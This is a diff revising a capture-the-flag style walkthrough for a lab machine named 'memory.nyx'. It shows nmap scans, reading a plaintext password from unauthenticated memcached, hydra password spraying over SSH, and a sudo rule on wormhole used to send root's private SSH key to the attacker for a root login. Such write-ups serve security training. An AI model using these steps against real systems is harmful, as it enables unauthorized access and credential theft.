@@ -13,9 +13,9 @@
 An unauthenticated `memcached` instance leaks a stored password directly. Without a matching username, that password is sprayed across a whole list of common names over SSH instead of the other way around, landing valid credentials for `alan`. From there, a `sudo` rule around `wormhole` — a tool built for secure file transfer between two consenting parties — is repurposed to exfiltrate root's private SSH key.
 
 ## Enumeration
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn memory.nyx
@@ -27,7 +27,7 @@ PORT     STATE  SERVICE   REASON
 MAC Address: 08:00:27:AB:58:3F (Oracle VirtualBox virtual NIC)
 ```
 
-Three ports are found open: **22 (SSH)**, **80 (HTTP)**, and **11211**, the default port for `memcached`. A version/script scan against all three fills in the details:
+Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **11211**, the default port for `memcached`. A version and script scan on all three fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80,11211 -sCV memory.nyx
@@ -68,13 +68,14 @@ PORT      STATE  SERVICE    VERSION
 MAC Address: 08:00:27:AB:58:3F (Oracle VirtualBox virtual NIC)
 ```
 
-`memcached` is a key-value cache, and by default it has no authentication at all — anything that can reach the port can read and write every key stored in it. All stored keys are dumped, and one of them is checked directly:
+`memcached` is a key-value cache, and by default it has no authentication at all — anything that can reach the port can read and write every key stored in it. `memcdump` lists all stored keys, and `memccat` reads the interesting one:
 
 ```bash
 $ memcdump --servers=memory.nyx
 password
 ```
-```Bash
+
+```bash
 $ memccat --servers=memory.nyx password
 NewPassword2025
 ```
@@ -86,6 +87,7 @@ The `password` key holds a plaintext value, presumably meant for some internal s
 ```
 http://memory.nyx
 ```
+
 <img src="../Images/memory/Pasted image 20260729112014.png"/>
 
 ```bash
@@ -102,11 +104,13 @@ Finished
 ===============================================================
 ```
 
+The web root is just the default Apache page with nothing hidden behind it, so the memcached password is the only real lead into the box.
+
 ## Initial Access
 
 ### Password Spraying via SSH
 
-With a password but no matching username, the spray runs in reverse: one fixed password — presumably the value pulled from `memcached` — against a whole list of common names:
+With a password but no matching username, the spray runs in reverse: one fixed password — the value pulled from `memcached` — against a whole list of common names:
 
 ```bash
 $ hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p 'NewPassword2025' ssh://memory.nyx -t 64 -f
@@ -156,7 +160,7 @@ User alan may run the following commands on memory:
     (root) NOPASSWD: /usr/bin/wormhole
 ```
 
-`alan` can run `/usr/bin/wormhole` as root. `wormhole` (from `magic-wormhole`) is a legitimate tool for sending a file securely between two machines using a short, one-time code — but it doesn't care *what* file it's sending, only that the process running it can read it. With root privileges via `sudo`, that includes files a normal user never could:
+`alan` can run `/usr/bin/wormhole` as root. `wormhole` (from `magic-wormhole`) is a legitimate tool for sending a file securely between two machines using a short, one-time code — but it doesn't care *what* file it's sending, only that the process running it can read it. Run as root through `sudo`, that includes files a normal user never could:
 
 ```bash
 alan@memory:~$ sudo /usr/bin/wormhole --help
@@ -182,6 +186,7 @@ Commands:
   send     Send a text message, file, or directory
   ssh      Facilitate sending/receiving SSH public keys
 ```
+
 ```bash
 alan@memory:~$ sudo /usr/bin/wormhole send /root/.ssh/id_rsa
 Sending 2.6 kB file named 'id_rsa'
@@ -207,6 +212,8 @@ Receiving (←tcp:memory.nyx:41055)..
 100%|████████████████████████████████████████████| 2.59k/2.59k [00:00<00:00, 10.5kB/s]
 Received file written to id_rsa
 ```
+
+With root's private key in hand, SSH gives a root shell directly:
 
 ```bash
 $ ssh root@memory.nyx -i id_rsa
